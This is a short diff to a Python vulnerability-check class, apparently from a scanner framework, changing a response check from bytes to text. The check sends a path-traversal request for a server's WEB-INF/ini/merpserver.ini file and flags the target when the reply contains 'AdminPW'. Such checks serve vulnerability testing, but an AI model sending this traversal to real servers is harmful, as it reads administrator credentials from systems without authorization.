@@ -51,7 +51,7 @@ class Poc(ABPoc):
                           '../../../../../../WEB-INF/ini/merpserver.ini') % self.target
 
             req = requests.get(verify_url)
-            if req.status_code == 200 and 'AdminPW' in req.content:
+            if req.status_code == 200 and 'AdminPW' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
